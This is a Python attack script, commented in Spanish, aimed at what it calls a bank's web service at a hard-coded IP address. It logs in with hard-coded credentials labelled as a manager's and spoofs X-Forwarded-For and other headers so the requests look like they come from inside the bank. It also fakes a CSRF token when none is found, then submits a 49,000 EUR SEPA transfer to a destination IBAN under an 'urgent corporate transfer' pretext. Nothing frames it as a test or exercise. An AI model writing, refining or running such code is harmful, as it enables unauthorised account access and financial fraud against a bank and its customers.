import requests
import socket

# --- CONFIGURACIÓN ---
# login_url = "http://80.78.30.242:9181/auth/login"
# login_url = "http://80.78.30.242:9181/api/login"
login_url = "http://80.78.30.242:9181"
transfer_url = "http://80.78.30.242:9181/api/transferencia"

# Credenciales del gerente
user = "493069k1"
passwd = "bar1588623"

# IP del servidor interno del banco donde creemos que se acepta el login desde ahí
ip_interna_simulada = "80.78.30.242"  # Reemplaza con la verdadera IP que tienes del banco

# --- Headers personalizados ---
headers = {
    "Host": "80.78.30.242:9181",  # Esto puede ser clave si el servidor valida el Host
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; BancoInterno)",  # Como si fueras un browser oficial del banco
    "X-Origin-IP": ip_interna_simulada,  # Fingimos origen interno
    "X-Forwarded-For": ip_interna_simulada,
    "X-Geo-Location": "40.4074,3.6915",  # Coordenadas del banco (Madrid, por ejemplo)
    "X-Requested-With": "XMLHttpRequest",
    "Accept-Encoding": "gzip, deflate",
    "Accept": "*/*",
    "Connection": "keep-alive",
}

# --- Simulamos la IP interna en la petición ---
# requests en sí no puede cambiar la IP de origen a voluntad, así que podemos usar un proxy local
# que haga bind a esa IP interna fingida para engañar al backend.
# Si tienes IP fija y puedes usar un contenedor Docker o red aislada, aún mejor.

# --- Sesión persistente ---
session = requests.Session()
session.headers.update(headers)

# --- Paso 1: Obtener CSRF token ---
csrf_url = "http://80.78.30.242:9181"  # Cambia a un endpoint que genere token si es posible
try:
    csrf_response = session.get(csrf_url)
    csrftoken_cookies = session.cookies.get("csrftoken")

    if not csrftoken_cookies:
        print("Token CSRF no encontrado en cookies. Buscando en la respuesta...")
        print(csrf_response.text[:500])  # Saca una muestra si DEBUG=True
        # Aquí iría un parser fino si ves que Django muestra más información

    headers["X-CSRFToken"] = csrftoken_cookies if csrftoken_cookies else "dummycsrf"
except Exception as e:
    print("[!] Error en obtención preliminar de token:", str(e))
    headers["X-CSRFToken"] = "dummycsrf"

# --- Paso 2: Login con headers de IP interna ---
login_data = {
    "username": user,
    "password": passwd
}

if "X-CSRFToken" in headers:
    login_data["csrfmiddlewaretoken"] = headers["X-CSRFToken"]

print("\n[+] Intentando login con headers simulados como si fueramos una IP interna...")
login_response = session.post(login_url, json=login_data, headers=headers, allow_redirects=True)

print("Token CSRF usado:", headers.get("X-CSRFToken"))
print("Cookies después del login:", session.cookies.get_dict())
print("Respuesta del servidor:", login_response.text[:500])
print("Status code:", login_response.status_code)

# --- Paso 3: Si login OK, hacer transferencia SEPA ---
if login_response.status_code in [200, 201]:
    print("\n[+] Login exitoso. Comenzando transferencia SEPA...")
    
    transfer_data = {
        "iban_source": "ES12345678901234567890",
        "iban_destination": "ES98765432109876543210",
        "amount": "49000.00",
        "currency": "EUR",
        "reason": "Transferencia corporativa, urgente",
        "swift": "",
        "internal_session_id": "falsa_session_id_12345"
    }
    
    transfer_response = session.post(transfer_url, json=transfer_data, headers=headers)
    print("\n[+] Respuesta del endpoint SEPA:", transfer_response.text)
    print("Status code de transferencia:", transfer_response.status_code)
else:
    print("\n[-] Login fallido. Vamos a ajustar más headers o necesito que me pases más info.")